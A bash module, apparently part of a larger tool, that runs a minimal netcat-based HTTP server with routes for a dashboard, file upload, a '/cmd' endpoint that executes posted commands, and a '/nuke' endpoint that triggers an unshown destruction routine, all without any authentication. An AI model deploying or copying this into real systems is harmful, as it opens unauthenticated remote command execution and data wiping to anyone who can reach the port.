#!/bin/bash
# HTTP Server Module - Handles incoming connections and routes requests

start_http_server() {
    while true; do
        # Create named pipe for request handling
        FIFO="$TEMP_DIR/http_$$"
        rm -f "$FIFO"
        mkfifo "$FIFO"
        
        # Listen for connection and process request
        cat "$FIFO" | nc -l -p "$SERVER_PORT" > >(handle_request > "$FIFO")
        
        rm -f "$FIFO"
    done
}

handle_request() {
    local method=""
    local path=""
    local content_length=0
    local content_type=""
    local boundary=""
    local line
    
    # Read request line
    read -r line
    method=$(echo "$line" | awk '{print $1}')
    path=$(echo "$line" | awk '{print $2}')
    
    # Read headers
    while IFS= read -r line; do
        line=$(echo "$line" | tr -d '\r')
        
        if [ -z "$line" ]; then
            break
        fi
        
        if echo "$line" | grep -qi "^Content-Length:"; then
            content_length=$(echo "$line" | cut -d: -f2 | tr -d ' ')
        fi
        
        if echo "$line" | grep -qi "^Content-Type:"; then
            content_type=$(echo "$line" | cut -d: -f2- | tr -d ' ')
            if echo "$content_type" | grep -q "boundary="; then
                boundary=$(echo "$content_type" | sed 's/.*boundary=\([^;]*\).*/\1/')
            fi
        fi
    done
    
    # Route the request
    case "$method:$path" in
        "GET:/")
            serve_dashboard
            ;;
        "POST:/upload")
            handle_upload "$content_length" "$boundary"
            ;;
        "POST:/cmd")
            handle_command "$content_length"
            ;;
        "POST:/nuke")
            handle_nuke
            ;;
        *)
            send_response "404 Not Found" "text/plain" "Not Found"
            ;;
    esac
}

serve_dashboard() {
    if [ -f "views/dashboard.html" ]; then
        local content
        content=$(cat views/dashboard.html)
        local length=${#content}
        echo -e "$HTTP_200\r"
        echo -e "Content-Type: text/html\r"
        echo -e "Content-Length: $length\r"
        echo -e "Connection: close\r"
        echo -e "\r"
        echo -n "$content"
    else
        send_response "500 Internal Server Error" "text/plain" "Dashboard not found"
    fi
}

send_response() {
    local status="$1"
    local content_type="$2"
    local body="$3"
    local length=${#body}
    
    echo -e "HTTP/1.1 $status\r"
    echo -e "Content-Type: $content_type\r"
    echo -e "Content-Length: $length\r"
    echo -e "Connection: close\r"
    echo -e "\r"
    echo -n "$body"
}

handle_upload() {
    local content_length="$1"
    local boundary="$2"
    
    local result
    result=$(parse_upload_request "$content_length" "$boundary")
    
    if [ $? -eq 0 ]; then
        send_response "200 OK" "application/json" "$result"
    else
        send_response "500 Internal Server Error" "application/json" "{\"success\":false,\"message\":\"Upload failed: $result\"}"
    fi
}

handle_command() {
    local content_length="$1"
    
    local result
    result=$(parse_and_run_command "$content_length")
    
    send_response "200 OK" "application/json" "$result"
}

handle_nuke() {
    send_response "200 OK" "application/json" "{\"success\":true,\"message\":\"Nuke initiated\"}"
    
    # Give response time to send, then nuke
    sleep 1
    execute_nuke
}
